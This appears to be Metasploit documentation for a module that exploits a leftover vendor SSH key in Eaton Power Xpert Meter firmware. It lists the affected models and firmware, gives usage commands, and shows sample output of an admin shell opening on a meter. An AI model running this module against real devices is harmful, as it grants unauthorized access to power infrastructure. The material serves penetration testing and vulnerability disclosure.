The eaton_xpert_backdoor module scans for Eaton Xpert Power meters with a vendor SSH private key used in the device firmware's build process.

## Vulnerable Application

  Eaton is a power management company with a wide range of power management products.
  Power meters sold by Eaton used a firmware build process for many years that left a developer key pair in the default profile.
  Specific models include: Power Xpert Meter 4000/6000/8000
  

## Verification Steps

**Usage**
```
- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/ssh/eaton_xpert_backdoor`
- [ ] `set RHOSTS 192.168.135.155`
- [ ] `run -z`
- [ ] `Vulnerable hosts should present a shell`
```

**Example output**
```
[+] 192.168.135.155:22 - Logged in as admin
[*] Command shell session 1 opened (192.168.135.1:62063 -> 192.168.135.155:22) at 2018-08-31 19:12:21 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- [ ] `sessions`
```

Active sessions
===============

  Id  Name  Type   Information                                                      Connection
  --  ----  ----   -----------                                                      ----------
  1         basic   Eaton Xpert Meter SSH Backdoor (SSH-2.0-OpenSSH_7.7p1 Debian-4)  192.168.135.1:62063 -> 192.168.135.155:22 (192.168.135.155)

```


## Options

  **Option name**

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    22               yes       The target port
   THREADS  1                yes       The number of concurrent threads


### Powermeter Firmware versions

Software Link: http://www.eaton.com/Eaton/ProductsServices/Electrical/ProductsandServices/PowerQualityandMonitoring/PowerandEnergyMeters/PowerXpertMeter400060008000/index.htm#tabs-2

Version: Firmware <= 12.x and <= 13.3.x.x and below more versions may be impacted
Tested on: Firmware 12.1.9.1 and 13.3.2.10
